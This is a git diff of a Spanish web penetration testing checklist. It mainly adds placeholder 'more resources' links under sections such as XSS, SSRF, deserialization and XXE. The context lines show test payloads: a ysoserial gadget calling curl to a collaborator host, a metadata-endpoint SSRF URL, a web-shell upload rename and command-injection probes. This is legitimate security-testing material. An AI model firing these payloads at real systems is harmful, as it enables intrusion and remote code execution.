@@ -1,7 +1,3 @@
-<div style="border-left: 4px solid #e85d4a; background: #fff5f5; padding: 8px 16px; border-radius: 4px;">
-📖 <strong>Más recursos:</strong> <a href="https://github.com/tu-repo/...">Nombre del recurso</a>
-</div>
-
 # Checklist Web
 
 > Siempre que sea posible, utilizar al menos 2 cuentas durante las pruebas. Una con privilegios bajos y otra con privilegios de administración, para validar la escalada vertical. Para la escalada horizontal, usar 2 cuentas con el mismo rol.
@@ -193,6 +189,8 @@ retire --js --path /ruta/al/js
 
 ## 🔓 Access control
 
+> 📖 **[Más recursos sobre Access Control Vulnerabilities](https://github.com/tu-repo/...)**
+
 ### 1. Acceso sin autenticación y tras cierre de sesión
 
 * [ ] Verificar si es posible acceder al recurso incluso si el usuario no está autenticado.
@@ -262,6 +260,8 @@ retire --js --path /ruta/al/js
 
 ## 🔌 API Testing
 
+> 📖 **[Más recursos sobre APIs Vulnerabilities](https://github.com/tu-repo/...)**
+
 ### 1. Documentación expuesta públicamente
 
 * [ ] Buscar documentación de la API expuesta públicamente en rutas conocidas:
@@ -318,6 +318,8 @@ retire --js --path /ruta/al/js
 ***
 
 ## 🔑 Autenticación
+
+> 📖 **[Más recursos sobre Autentication Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Enumeración de usuarios
 
@@ -417,6 +419,8 @@ email=victim@target.com
 ***
 
 ## 👆 Clickjacking
+
+> 📖 **[Más recursos sobre Clickjacking Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Verificar si la aplicación es vulnerable a Clickjacking
 
@@ -565,6 +569,8 @@ email=victim@target.com
 
 ## 🎯 Cabeceras de seguridad
 
+> 📖 **[Más recursos sobre Security Headers Vulnerabilities](https://github.com/tu-repo/...)**
+
 ### 1. Análisis general de cabeceras
 
 * [ ] Ejecutar [**shcheck**](https://github.com/santoru/shcheck) o [**SecurityHeaders.com**](https://securityheaders.com) para obtener una visión general del estado de las cabeceras de seguridad de la aplicación.
@@ -644,6 +650,8 @@ python shcheck.py https://target.com
 ***
 
 ## 🎭 CSRF
+
+> 📖 **[Más recursos sobre CSRF Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Sin defensa
 
@@ -730,6 +738,9 @@ _method=GET&email=attacker@evil.com
 ***
 
 ## 💉 XSS
+
+> 📖 **[Más recursos sobre XSS Vulnerabilities](https://github.com/tu-repo/...)**
+
 
 ### Nota sobre detección automática
 
@@ -831,6 +842,9 @@ javascript:alert(document.domain)
 ***
 
 ## 📂 File Upload
+
+> 📖 **[Más recursos sobre File Upload Vulnerabilities](https://github.com/tu-repo/...)**
+
 
 ### 1. Shell upload sin protección
 
@@ -988,6 +1002,9 @@ mv imagen.jpg shell.php.jpg
 
 ## 📡 GraphQL
 
+> 📖 **[Más recursos sobre GraphQL Vulnerabilities](https://github.com/tu-repo/...)**
+
+
 ### 1. Detección del endpoint GraphQL
 
 * [ ] Buscar el endpoint GraphQL en rutas conocidas:
@@ -1056,6 +1073,9 @@ mv imagen.jpg shell.php.jpg
 ***
 
 ## 🍪 Gestión de sesiones
+
+> 📖 **[Más recursos sobre Session Management Vulnerabilities](https://github.com/tu-repo/...)**
+
 
 ### 1. Identificación del mecanismo de sesión
 
@@ -1144,6 +1164,8 @@ Cookie: session=ATTACKER_CONTROLLED_VALUE
 
 ## 🌐 Host Header Attacks
 
+> 📖 **[Más recursos sobre Host Header Vulnerabilities](https://github.com/tu-repo/...)**
+
 ### 1. Cabeceras alternativas de override de Host
 
 > Antes de probar cualquier ataque de Host Header, verificar estas cabeceras alternativas en todos los casos — muchos servidores y proxies las aceptan como override del valor de `Host`.
@@ -1198,6 +1220,8 @@ Host: admin.target.com
 
 ## 🚢 HTTP Request Smuggling
 
+> 📖 **[Más recursos sobre HTTP Smuggling Vulnerabilities](https://github.com/tu-repo/...)**
+
 > ⚠️ **Nota de precaución:** El HTTP Request Smuggling puede afectar a peticiones de otros usuarios reales de la aplicación. Extremar la precaución en entornos productivos — usar preferiblemente en ventanas de mantenimiento o entornos de staging.
 
 ### 1. Detección automática
@@ -1234,6 +1258,8 @@ SMUGGLED
 ***
 
 ## 📦 Deserialización insegura
+
+> 📖 **[Más recursos sobre Insecure Deserialization Vulnerabilities](https://github.com/tu-repo/...)**
 
 > 💡 **Nota:** La deserialización insegura no ocurre solo en cookies — verificar también en parámetros GET/POST, cabeceras HTTP, APIs y ficheros subidos que sean deserializados en el servidor. Si el valor de una cookie parece un objeto serializado, aplicar esta sección.
 
@@ -1307,6 +1333,8 @@ java -jar ysoserial.jar CommonsCollections6 'curl https://collaborator-id.oastif
 ***
 
 ## 🍃 NoSQL
+
+> 📖 **[Más recursos sobre NoSQL Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Identificación del motor NoSQL
 
@@ -1386,6 +1414,8 @@ python3 nosqlmap.py
 ***
 
 ## 💻 Command Injection
+
+> 📖 **[Más recursos sobre Command Injection Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -1539,6 +1569,8 @@ ${u=id}${u}
 ***
 
 ## 📁 Path Traversal
+
+> 📖 **[Más recursos sobre Path Traversal Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -1708,6 +1740,8 @@ Una vez confirmado el traversal, escalar a ficheros más sensibles.
 
 ## 🧪 Prototype pollution
 
+> 📖 **[Más recursos sobre Prototype Pollution Vulnerabilities](https://github.com/tu-repo/...)**
+
 > 💡 **Nota:** El impacto de Prototype Pollution depende de encontrar **gadgets** — fragmentos de código de la aplicación o de librerías que usen propiedades del prototipo contaminado para ejecutar acciones sensibles (XSS, bypass de controles, RCE en servidor).
 
 
@@ -1788,6 +1822,8 @@ https://target.com/?__proto__[href]=javascript:alert(1)
 ***
 
 ## 🔄 SSRF
+
+> 📖 **[Más recursos sobre SSRF Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -1972,6 +2008,8 @@ url=https://allowed-domain.com/redirect?to=http://169.254.169.254/
 
 ## 🧩 SSTI
 
+> 📖 **[Más recursos sobre SSTI Vulnerabilities](https://github.com/tu-repo/...)**
+
 ### 1. Identificación de puntos de entrada
 
 * [ ] Identificar campos cuyo valor se renderiza a través de un motor de plantillas:
@@ -2047,6 +2085,8 @@ Una vez identificado el motor, probar ejecución de comandos:
 ***
 
 ## 💉 SQL Injection
+
+> 📖 **[Más recursos sobre SQL Injection Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### Nota sobre detección y explotación automática
 
@@ -2200,6 +2240,8 @@ testssl.sh --full https://target.com
 ***
 
 ## 📄 XXE
+
+> 📖 **[Más recursos sobre XXE Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -2394,6 +2436,8 @@ Content-Type: application/xml
 ***
 
 ## 💀 Web Cache Poisoning
+
+> 📖 **[Más recursos sobre Web Cache Poisoning Vulnerabilities](https://github.com/tu-repo/...)**
 
 ### 1. Detección del sistema de caché
 
